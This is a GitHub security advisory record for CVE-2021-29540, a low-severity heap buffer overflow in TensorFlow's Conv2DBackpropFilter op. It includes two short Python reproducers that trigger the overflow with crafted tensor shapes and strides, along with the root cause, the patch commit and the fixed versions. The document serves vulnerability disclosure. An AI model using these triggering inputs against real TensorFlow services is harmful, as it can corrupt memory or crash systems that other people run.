{
    "ghsaId": "GHSA-xgc3-m89p-vr3x",
    "severity": "LOW",
    "summary": "Heap buffer overflow in `Conv2DBackpropFilter`",
    "description": "### Impact\nAn attacker can cause a heap buffer overflow to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([386.078431372549, 386.07843139643234],\n                           shape=[1, 1, 1, 2], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([386.078431372549], shape=[1, 1, 1, 1],\n                           dtype=tf.float32)\n  \ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1],\n  use_cudnn_on_gpu=True,\n  padding='VALID',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)\n```\n\nAlternatively, passing empty tensors also results in similar behavior: \n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)\nfilter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes, \n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1], \n  use_cudnn_on_gpu=True,\n  padding='VALID',\n  explicit_paddings=[],\n  data_format='NHWC',\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L495-L497) computes the size of the filter tensor but does not validate that it matches the number of elements in `filter_sizes`. Later, when reading/writing to this buffer, code uses the value computed here, instead of the number of elements in the tensor.\n\n### Patches \nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
    "permalink": "https://github.com/advisories/GHSA-xgc3-m89p-vr3x",
    "publishedAt": "2021-05-21T14:23:09Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-xgc3-m89p-vr3x"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-29540"
        }
    ]
}